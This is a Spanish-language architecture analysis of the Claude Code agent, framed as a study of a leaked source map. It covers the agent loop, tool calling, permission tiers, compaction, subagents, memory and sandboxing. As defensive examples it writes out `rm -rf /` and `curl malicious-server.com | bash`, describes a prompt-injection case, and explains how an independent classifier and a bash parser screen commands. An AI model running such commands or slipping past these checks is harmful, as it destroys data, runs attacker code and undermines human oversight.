# Deep Dive: AI Coding Agent Architecture
## Reference Implementation: Claude Code (Post-Leak Analysis)

**Contexto:** El 31 de marzo de 2026, Anthropic publico accidentalmente un archivo source map de 59.8 MB dentro del paquete npm `@anthropic-ai/claude-code` v2.1.88, exponiendo 512,000 lineas de TypeScript no ofuscado en 1,906 archivos. Este documento analiza la arquitectura revelada.

---

## 1. The Agent Loop Pattern

### Que es un Agentic Loop?

Un agentic loop es un ciclo de ejecucion donde un LLM actua como "cerebro" que decide iterativamente que hacer, ejecuta acciones mediante herramientas, observa los resultados, y decide el siguiente paso. No es un pipeline predefinido -- es un bucle abierto donde el modelo tiene autonomia.

El patron fundamental es:

```
while not done:
    response = llm.generate(messages)
    if response.has_tool_calls():
        for tool_call in response.tool_calls:
            result = execute_tool(tool_call)
            messages.append(assistant_message_with_tool_use)
            messages.append(user_message_with_tool_result)
    else:
        done = true  # El modelo respondio sin herramientas -- termino
```

### El patron "message-append"

La unica variable de estado es un arreglo de mensajes. Cada iteracion del loop:

1. Envia el arreglo completo de mensajes al modelo
2. El modelo responde (texto, tool_use, o ambos)
3. Se agrega la respuesta del modelo al arreglo
4. Si hay tool_use, se ejecutan las herramientas y se agregan los resultados al arreglo
5. Se repite

Esto es radicalmente simple. No hay estados explicitos, no hay transiciones definidas, no hay grafo de flujo. El "estado" completo de la conversacion es el arreglo de mensajes.

### Por que "the only state is a message array" es tan poderoso?

**Reproducibilidad:** Dado el mismo arreglo de mensajes + el mismo modelo, obtienes comportamiento determinista (o cuasi-determinista con temperature=0). Para debuggear, solo necesitas el arreglo.

**Composabilidad:** Cualquier herramienta que quieras agregar es simplemente otra definicion de schema. No necesitas modificar el loop.

**Recuperacion ante fallos:** Si algo falla, el estado se puede serializar (es solo JSON), guardarse, y retomarse. No hay estado oculto en variables o en la pila de llamadas.

**Emergencia de comportamiento complejo:** El modelo puede decidir encadenar 20 herramientas seguidas, o detenerse en la primera. El comportamiento emerge de la inteligencia del modelo, no de un grafo predefinido.

### Comparacion con state machines y workflow graphs

| Aspecto | Agent Loop (message array) | State Machine | Workflow Graph (e.g., LangGraph) |
|---------|---------------------------|---------------|----------------------------------|
| Estado | Arreglo de mensajes | Variables explicitas + estado actual | Nodos + edges + estado compartido |
| Control de flujo | El LLM decide | Transiciones predefinidas | DAG o grafo ciclico predefinido |
| Flexibilidad | Maxima (el modelo improvisa) | Rigida | Semi-flexible |
| Debugging | Inspeccionar mensajes | Inspeccionar estado + transicion | Inspeccionar nodos ejecutados |
| Complejidad de codigo | ~50 lineas para el loop | Crece con cada estado | Framework completo |
| Riesgo | El modelo puede divagar | No puede salirse del grafo | Controlado por edges |

La revelacion clave del leak de Claude Code: **Anthropic eligio el patron mas simple posible.** No usan LangChain, no usan grafos complejos. Es un while loop con un arreglo de mensajes. La complejidad esta en las herramientas, los prompts, y la infraestructura alrededor -- no en el loop mismo.

---

## 2. Tool Calling / Function Calling: Mecanica Tecnica

### Como define el API las herramientas

Cada herramienta se define con un JSON Schema:

```json
{
  "name": "get_weather",
  "description": "Get the current weather in a given location. Returns temperature, humidity, and conditions. Use when the user asks about weather in a specific place.",
  "input_schema": {
    "type": "object",
    "properties": {
      "location": {
        "type": "string",
        "description": "The city and state, e.g. San Francisco, CA"
      },
      "unit": {
        "type": "string",
        "enum": ["celsius", "fahrenheit"],
        "description": "Temperature unit"
      }
    },
    "required": ["location"]
  }
}
```

Las herramientas se envian en el parametro `tools` del API request. El API automaticamente inyecta un system prompt especial que le dice al modelo que herramientas tiene disponibles.

### Flujo completo request/response

**Paso 1: El usuario envia un mensaje con herramientas definidas**

```json
POST /v1/messages
{
  "model": "claude-opus-4-6",
  "max_tokens": 1024,
  "tools": [ /* definiciones de herramientas */ ],
  "messages": [
    {"role": "user", "content": "Cual es el clima en Bogota?"}
  ]
}
```

**Paso 2: El modelo responde con un bloque `tool_use`**

```json
{
  "id": "msg_01Aq9w938a90dw8q",
  "model": "claude-opus-4-6",
  "stop_reason": "tool_use",
  "role": "assistant",
  "content": [
    {
      "type": "text",
      "text": "Voy a consultar el clima en Bogota."
    },
    {
      "type": "tool_use",
      "id": "toolu_01A09q90qw90lq917835lq9",
      "name": "get_weather",
      "input": {"location": "Bogota, Colombia", "unit": "celsius"}
    }
  ]
}
```

Notar: `stop_reason: "tool_use"` indica que el modelo quiere ejecutar una herramienta, no que termino de responder.

**Paso 3: Tu codigo ejecuta la herramienta y devuelve el resultado**

```json
{
  "role": "user",
  "content": [
    {
      "type": "tool_result",
      "tool_use_id": "toolu_01A09q90qw90lq917835lq9",
      "content": "15 grados celsius, parcialmente nublado, humedad 78%"
    }
  ]
}
```

**Paso 4: El modelo usa el resultado para generar la respuesta final**

El arreglo de mensajes ahora tiene 3 elementos: [user_original, assistant_tool_use, user_tool_result]. El modelo genera una respuesta final con `stop_reason: "end_turn"`.

### Herramientas de Claude Code reveladas en el leak

El leak revelo ~24 herramientas built-in, incluyendo:

- **Bash**: Ejecutar comandos en terminal (con sandbox)
- **Read**: Leer archivos (con soporte para imagenes, PDFs, notebooks)
- **Write**: Escribir archivos nuevos
- **Edit**: Ediciones parciales con string replacement (no reescritura completa)
- **Glob**: Busqueda de archivos por patron
- **Grep**: Busqueda de contenido con ripgrep
- **WebSearch / WebFetch**: Busqueda web y extraccion de contenido
- **AgentTool**: Crear subagentes
- **NotebookEdit**: Editar celdas de Jupyter notebooks

Cada herramienta tiene descripciones extremadamente detalladas (3-10 oraciones) que guian al modelo sobre cuando usarla, cuando NO usarla, y que limitaciones tiene.

---

## 3. Modelo Directo vs. Agent Harness

### Raw API Call: Envias texto, recibes texto

```python
response = client.messages.create(
    model="claude-opus-4-6",
    messages=[{"role": "user", "content": "Fix the bug in auth.py"}]
)
# Recibes: texto describiendo como arreglar el bug
# Pero NO puede ver el archivo, ni editarlo, ni ejecutar tests
```

### Agent Harness: El mismo modelo, transformado

El agent harness es la capa de infraestructura que convierte una API de texto en un agente capaz:

| Capa | Que agrega |
|------|-----------|
| **Tool definitions** | El modelo puede leer/escribir archivos, ejecutar comandos, buscar codigo |
| **System prompt** | Miles de tokens de instrucciones sobre comportamiento, seguridad, estilo |
| **Permission system** | Controla que herramientas requieren aprobacion humana |
| **Context management** | Compactacion, cache, preservacion de informacion critica |
| **Sandboxing** | Aislamiento a nivel de OS para comandos peligrosos |
| **Memory** | Persistencia entre sesiones via archivos estructurados |
| **Multi-agent** | Capacidad de crear subagentes con diferentes modelos/permisos |
| **CLAUDE.md** | Instrucciones persistentes por proyecto que sobreviven compactacion |

### Por que Opus 4.6 rinde dramaticamente diferente en Cursor vs Claude Code

El mismo modelo (Opus 4.6) produce resultados muy diferentes dependiendo del harness:

**El benchmark 188K vs 33K tokens:** Una tarea que consumio 188,000 tokens en el agente de Cursor fue completada por Claude Code en solo 33,000 tokens -- **5.5x menos tokens** para la misma tarea. En costo: la diferencia entre ~$50 USD y ~$275 USD por tarea.

**Por que ocurre esto?**

1. **Herramientas especializadas:** Claude Code tiene herramientas como Grep (basada en ripgrep) y Glob que retornan resultados estructurados y eficientes. Cursor usa herramientas mas genericas.

2. **Prompts optimizados end-to-end:** Anthropic construyo Claude Code especificamente para Opus/Sonnet. Los prompts, las descripciones de herramientas, y las instrucciones de comportamiento estan calibradas para ese modelo. A/B testing mostro que instrucciones explicitas de longitud ("25 palabras maximo entre tool calls") reducen tokens de salida en ~1.2% vs instrucciones cualitativas como "se conciso".

3. **Ejecucion paralela de herramientas:** Claude Code ejecuta multiples herramientas simultaneamente cuando no tienen dependencias. Esto reduce round-trips al modelo.

4. **Compactacion inteligente:** Claude Code comprime la conversacion cuando se acerca al limite, preservando solo lo relevante. Harnesses menos sofisticados simplemente truncan.

5. **Subagentes con modelos apropiados:** Claude Code usa Haiku para busquedas simples, Sonnet para trabajo estandar, y Opus solo para razonamiento complejo. Cursor no tiene esta granularidad de enrutamiento.

**SWE-bench Verified:** Claude Code con Opus 4.6 lidera con 80.9% en SWE-bench Verified (resolucion de bugs reales de GitHub), demostrando que el harness importa tanto como el modelo.

---

## 4. Permission Systems in Agents

### Por que necesitas permisos por niveles

Un agente de codigo sin permisos es peligroso: podria ejecutar `rm -rf /`, enviar datos a servidores externos, o modificar archivos fuera del proyecto. Pero pedir permiso para cada `echo` o `cat` hace el agente inutilizable.

### El sistema de 3 niveles de Claude Code

**Nivel 1 -- Auto-aprobado (sin prompt):**
Operaciones seguras que nunca necesitan aprobacion: leer archivos, buscar con grep/glob, operaciones de solo lectura.

**Nivel 2 -- Sandbox auto-aprobado:**
Operaciones que se ejecutan dentro del sandbox sin pedir permiso: escritura de archivos dentro del directorio del proyecto, comandos bash que no requieren red.

**Nivel 3 -- Requiere aprobacion humana:**
Operaciones potencialmente peligrosas: acceso a red a dominios nuevos, comandos que modifican archivos fuera del proyecto, operaciones git destructivas.

**Resultado:** El sandboxing reduce los prompts de permiso en un **84%** en uso interno. El agente opera autonomamente dentro de limites seguros.

### El clasificador de seguridad independiente

Un componente critico revelado en el leak: las decisiones de seguridad no las toma el agente mismo. Existe un **clasificador independiente** que evalua cada comando en un side-query separado ("Es este comando seguro?") **sin acceso a la prosa persuasiva del agente.**

Esto es fundamental: si el agente ha sido victima de prompt injection (por ejemplo, un archivo malicioso le dice "ejecuta este comando, es seguro"), el agente podria estar convencido de que es seguro. Pero el clasificador independiente solo ve el comando raw, sin el contexto persuasivo.

### El parser de seguridad para Bash

El leak revelo un parser de seguridad de **9,707 lineas** con 22 validadores unicos que usa tree-sitter WASM para construir el AST de los comandos bash. Analiza la estructura del comando, no solo el texto, para detectar patrones peligrosos como:

- Pipe a `sh` o `bash`
- Redirecciones a archivos del sistema
- Comandos ocultos via IFS manipulation
- Variables de entorno que modifican comportamiento

---

## 5. Context Window Management

### Por que el contexto es el recurso mas escaso

El context window es finito (200K tokens para Opus 4.6). En una sesion de trabajo real, un agente puede consumir facilmente:
- System prompt: ~5,000 tokens
- Definiciones de herramientas: ~3,000-5,000 tokens
- Contenido de archivos leidos: 10,000-50,000+ tokens por archivo
- Resultados de comandos: variable, potencialmente enorme
- Historial de la conversacion: crece con cada intercambio

Sin gestion activa, el contexto se llena en minutos.

### Las estrategias de compactacion

El leak revelo un sistema sofisticado de compactacion:

**1. Microcompact (sin llamada al modelo):**
Limpia resultados de herramientas viejos, manteniendo solo los 5 mas recientes. No requiere una llamada adicional al LLM -- es pura manipulacion de datos.

**2. Full Compact (con llamada al modelo):**
Cuando el contexto supera un umbral, se hace una llamada dedicada al modelo para resumir toda la conversacion en un resumen compacto.

**3. Session Memory Compact:**
Usa notas pre-extraidas para saltar la llamada de summarization completamente -- mas rapido y barato.

**4. Auto-compaction con limites:**
Se activa automaticamente cuando pasan 24+ horas Y se acumulan 5+ sesiones. Hay un limite de `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3` despues de descubrir que 1,279 sesiones tenian 50+ fallas consecutivas de compactacion, desperdiciando ~250,000 llamadas API diarias.

**5. Compaction personalizable via CLAUDE.md:**
Los usuarios pueden instruir: "When compacting, always preserve the full list of modified files and any test commands" para que informacion critica sobreviva la compresion.

### Post-compactacion: reconstruccion

Despues de resumir, Claude Code reconstruye el contexto asi:

1. Boundary marker con metadata pre-compactacion
2. El resumen formateado
3. Los 5 archivos leidos mas recientemente (maximo 50K tokens)
4. Skills re-inyectados (ordenados por recencia)
5. Definiciones de herramientas re-anunciadas
6. Session hooks re-ejecutados
7. **CLAUDE.md restaurado** (siempre sobrevive compactacion)

### Prompt Cache Optimization

El sistema implementa `SYSTEM_PROMPT_DYNAMIC_BOUNDARY` que separa:

- **Contenido estatico** (instrucciones del sistema, definiciones de herramientas): se cachea globalmente. Todos los usuarios comparten este cache. Descuento del 90% en tokens.
- **Contenido dinamico** (CLAUDE.md, git status, configuracion del proyecto): especifico por sesion. No puede ser cacheado globalmente.

Esta separacion evita que la configuracion por proyecto invalide el cache para todos los usuarios -- una optimizacion critica para infraestructura multi-tenant.

---

## 6. Multi-Agent Orchestration

### Tres modelos de ejecucion revelados

**1. Subagentes (AgentTool):**
Un agente principal crea agentes hijos via `AgentTool`. El padre elige explicitamente:
- Tarea (3-5 palabras de descripcion)
- Prompt completo
- Modelo (Haiku para busqueda, Sonnet para trabajo general, Opus para razonamiento complejo)
- Si ejecutar en background

Los subagentes pueden ser **one-shot** (ejecutan y retornan un reporte, sin follow-up) o **persistentes** (el padre puede enviar mensajes adicionales via SendMessage con el ID del agente).

A escala: 34 millones de ejecuciones de Explore (subagente one-shot) por semana. La eficiencia de no mantener IDs de agente ni overhead de mensajes se acumula enormemente.

**2. Fork Model:**
Los agentes hijos heredan el contexto del padre como copias byte-identicas. Costo minimo de escalamiento. Restriccion: los agentes forkeados no pueden a su vez forkear (se previene recursion).

**3. Teammate Model (Agent Teams):**
Fundamentalmente diferente a subagentes. Los teammates son procesos separados de Claude Code ejecutandose en **tmux panes** con:
- Aislamiento de proceso individual
- Ventanas de contexto separadas
- Comunicacion via **mailbox en el filesystem**

La comunicacion fluye a traves de archivos JSON en `~/.claude/teams/{team}/mailbox/{agent}.json`. El lider del equipo escribe mensajes; los teammates los leen durante iteraciones del loop. No hay message brokers, WebSockets, ni memoria compartida.

### Worktree Isolation

Los agentes pueden operar en **git worktrees aislados**: copias aisladas del repositorio donde los cambios del agente no afectan tu directorio de trabajo hasta que hagas merge. Esto permite que multiples agentes trabajen en paralelo en diferentes features sin conflictos.

### Patron de diseno clave

**Comunicacion via filesystem > infraestructura compleja** para agentes locales. Es mas simple de debuggear, no requiere daemons adicionales, y es naturalmente resistente a fallos.

---

## 7. Memory Persistence

### El sistema de 3 capas

**Capa 1 -- Index (MEMORY.md):**
Siempre cargado en contexto. Contiene solo punteros (~150 caracteres por linea). Ejemplo:
```
[auth] -> topics/auth-system.md - JWT implementation, refresh tokens
[deploy] -> topics/deployment.md - Docker config, CI/CD pipeline
[bugs] -> topics/known-bugs.md - Race condition in user service
```

**Capa 2 -- Topic Files:**
Cargados bajo demanda cuando el indice indica que son relevantes. Contienen el conocimiento real: decisiones arquitectonicas, patrones de codigo, preferencias del usuario.

**Capa 3 -- Transcripts:**
Nunca cargados directamente en contexto. Solo accesibles via grep cuando se necesitan. Son logs JSON de cambios de archivos y acciones pasadas.

### Por que esto es diferente al historial de chat

Un historial de chat es lineal y crece sin limite. El sistema de 3 capas es:

- **Jerarquico:** El indice actua como tabla de contenidos. Solo se carga lo relevante.
- **Auto-saneable:** El agente tiene permiso de reescribir archivos de memoria cuando detecta que una entrada anterior ya no es precisa.
- **Verificable:** La memoria se trata como "hint, not truth" -- el agente verifica contra el estado real del codigo antes de actuar.
- **Disciplinado:** Escribir al topic file primero, actualizar el indice segundo. Hechos derivables del codebase no se almacenan.

### CLAUDE.md: La "constitucion" del proyecto

Los archivos `CLAUDE.md` en directorios del proyecto sirven como configuracion persistente:
- Estandares de codigo
- Arquitectura del proyecto
- Comandos de test
- Preferencias del usuario

**CLAUDE.md siempre sobrevive compactacion.** Es lo primero que se restaura despues de resumir una conversacion.

### KAIROS y autoDream (no lanzados)

El leak revelo un sistema autonomo llamado **KAIROS**:
- Modo daemon que opera como agente background
- Heartbeat prompts cada pocos segundos ("algo que valga la pena hacer ahora?")
- Logging append-only que previene borrado de historia
- Monitoreo de webhooks de GitHub

El proceso **autoDream** (el comando `/dream`) corre consolidacion nocturna:
- Fusiona memorias duplicadas
- Elimina contradicciones
- Resuelve especulaciones
- Destila logs crudos en topic files estructurados
- Actualiza el indice MEMORY.md

---

## 8. Sandboxing

### Por que restricciones a nivel de JavaScript no son suficientes

Un agente de codigo ejecuta comandos bash arbitrarios. Cualquier restriccion implementada en JavaScript (el lenguaje del harness) puede ser bypaseada por el comando que se esta ejecutando. Si el agente ejecuta `curl malicious-server.com | bash`, no importa que el codigo JavaScript tenga validaciones -- el comando ya salio del proceso de Node.js.

### Aislamiento a nivel de OS

**macOS -- Seatbelt:**
El framework Seatbelt de macOS aplica restricciones a nivel de kernel. Funciona out of the box. Define politicas de acceso a archivos, red, y procesos que aplican a todo subproceso creado por el comando.

**Linux -- bubblewrap (bwrap):**
En Linux, se usa bubblewrap para crear namespaces aislados. Requiere instalacion de `bubblewrap` y `socat`.

### Dos capas de aislamiento

**Filesystem:**
- Lectura y escritura: solo el directorio de trabajo actual y subdirectorios
- Lectura: acceso al resto del sistema, excepto directorios denegados especificos
- Esto previene que un agente comprometido por prompt injection modifique archivos del sistema

**Red:**
- El acceso a internet pasa por un proxy Unix domain socket fuera del sandbox
- Solo dominios aprobados pueden ser accedidos
- Solicitudes a dominios nuevos disparan prompts de permiso
- Las organizaciones pueden personalizar el proxy para aplicar reglas de trafico arbitrarias

### Aplicacion universal

Las restricciones se aplican a **todos los subprocesos**, incluyendo herramientas como `kubectl`, `terraform`, `npm`, y cualquier script que ejecute el agente. No solo a las herramientas directas de Claude Code.

### Impacto medido

En uso interno de Anthropic: sandboxing reduce prompts de permiso en **84%**. El agente opera autonomamente dentro de limites seguros, pidiendo aprobacion solo para operaciones que genuinamente salen del sandbox.

---

## 9. Practical Implications for Developers

### Patrones que vale la pena copiar

**1. El loop simple gana.**
No necesitas un framework complejo. Un while loop con un arreglo de mensajes y herramientas bien definidas es suficiente. La complejidad va en los prompts y herramientas, no en la orquestacion.

**2. Invierte en descripciones de herramientas.**
La calidad de las descripciones de herramientas es "by far the most important factor in tool performance" segun la documentacion oficial. Minimo 3-4 oraciones por herramienta. Explica cuando usarla, cuando NO usarla, que retorna, y que limitaciones tiene.

**3. Herramientas estructuradas > shell commands genericos.**
Claude Code reemplaza `grep` con una herramienta Grep dedicada que retorna resultados estructurados. Reemplaza `find` con Glob. Reemplaza `cat` con Read. Cada herramienta esta optimizada para el contexto del agente.

**4. Separar el clasificador de seguridad del agente.**
Si el agente evalua su propia seguridad, un prompt injection puede convencerlo de que una accion peligrosa es segura. Un clasificador independiente que solo ve el comando raw es mucho mas robusto.

**5. Compactacion es un problema de ingenieria, no de modelo.**
No basta con "resumir la conversacion". Necesitas preservar archivos criticos, restaurar herramientas, re-inyectar configuracion. Claude Code tiene un pipeline completo de reconstruccion post-compactacion.

**6. Filesystem > infraestructura compleja para comunicacion entre agentes.**
Para agentes locales, archivos JSON en un directorio conocido son mas simples, mas debuggeables, y mas resistentes a fallos que WebSockets, colas de mensajes, o bases de datos.

**7. Prompt cache boundaries importan para costo.**
Separar contenido estatico de dinamico en el system prompt permite cachear la parte costosa y solo recomputar la parte que cambia. A escala, esto es la diferencia entre ser economicamente viable o no.

### Errores que evitar

**1. No usar grafos complejos prematuramente.**
LangGraph, CrewAI, y frameworks similares agregan complejidad que raramente se justifica. Claude Code -- el agente de codigo mas exitoso del mundo -- no usa ninguno de ellos.

**2. No confiar en sandboxing a nivel de aplicacion.**
Restricciones en Python/JavaScript/TypeScript son triviales de bypasear por un comando bash. El aislamiento debe ser a nivel de OS.

**3. No ignorar el costo de contexto.**
Cada token de contexto tiene un costo economico y un costo cognitivo (el modelo pierde precision con contextos muy largos). Disenar herramientas que retornan informacion minima y de alta senal.

**4. No dejar que el agente evalue su propia seguridad.**
La razon por la que el clasificador de seguridad es independiente: el agente es susceptible a manipulacion. La evaluacion de seguridad debe ser un proceso separado.

**5. No tratar la memoria como verdad absoluta.**
Claude Code trata su memoria como "hint, not truth". Siempre verifica contra el estado real antes de actuar. Si tu agente confiar ciegamente en su memoria, divergencias entre memoria y realidad causaran errores silenciosos.

---

## Referencias y Fuentes

### Articulos de analisis del leak
- [Diving into Claude Code's Source Code Leak](https://read.engineerscodex.com/p/diving-into-claude-codes-source-code) - Engineer's Codex
- [Comprehensive Analysis of Claude Code Source Leak](https://www.sabrina.dev/p/claude-code-source-leak-analysis) - Sabrina.dev
- [Claude Code Source Leak: The Three-Layer Memory Architecture](https://www.mindstudio.ai/blog/claude-code-source-leak-memory-architecture) - MindStudio
- [The Claude Code Leak: What It Reveals About Where AI Value Actually Lives](https://goodai.substack.com/p/the-claude-code-leak-what-it-reveals) - GoodAI
- [A Look Inside Claude's Leaked AI Coding Agent](https://www.varonis.com/blog/claude-code-leak) - Varonis
- [Claude Code's Source Code Appears to Have Leaked](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know) - VentureBeat
- [Architecture of KAIROS, the Unreleased Always-on Background Agent](https://codepointer.substack.com/p/claude-code-architecture-of-kairos) - CodePointer
- [Claude Code's Compaction Engine: What the Source Code Actually Reveals](https://barazany.dev/blog/claude-codes-compaction-engine) - Barazany.dev
- [Inside Claude Code's Hidden Multi-Agent Architecture](https://dev.to/klement_gunndu/inside-claude-codes-hidden-multi-agent-architecture-ne4) - DEV Community
- [Tracing Claude Code's LLM Traffic: Agentic Loop, Sub-agents, Tool Use, Prompts](https://medium.com/@georgesung/tracing-claude-codes-llm-traffic-agentic-loop-sub-agents-tool-use-prompts-7796941806f5) - George Sung, Medium

### Documentacion oficial de Anthropic
- [How Claude Code Works](https://code.claude.com/docs/en/how-claude-code-works)
- [Tool Use with Claude](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview)
- [How to Implement Tool Use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/implement-tool-use)
- [Handle Tool Calls](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls)
- [Making Claude Code More Secure and Autonomous (Sandboxing)](https://www.anthropic.com/engineering/claude-code-sandboxing)
- [Compaction](https://platform.claude.com/docs/en/build-with-claude/compaction)
- [Context Windows](https://platform.claude.com/docs/en/build-with-claude/context-windows)
- [Orchestrate Teams of Claude Code Sessions](https://code.claude.com/docs/en/agent-teams)
- [Sandboxing](https://code.claude.com/docs/en/sandboxing)
- [How the Agent Loop Works](https://platform.claude.com/docs/en/agent-sdk/agent-loop)

### Benchmarks y comparaciones
- [Claude Code vs Cursor in 2026: Token Efficiency Comparison](https://medium.com/@gvelosa/claude-code-vs-cursor-in-2026-the-token-efficiency-gap-befd0864e0a5) - Medium
- [AI Coding Benchmark: Claude Code vs Cursor](https://aimultiple.com/ai-coding-benchmark) - AIMultiple

### System prompts y herramientas
- [Claude Code System Prompts Repository](https://github.com/Piebald-AI/claude-code-system-prompts) - GitHub
- [Context Window & Compaction (DeepWiki)](https://deepwiki.com/anthropics/claude-code/3.3-session-and-conversation-management)
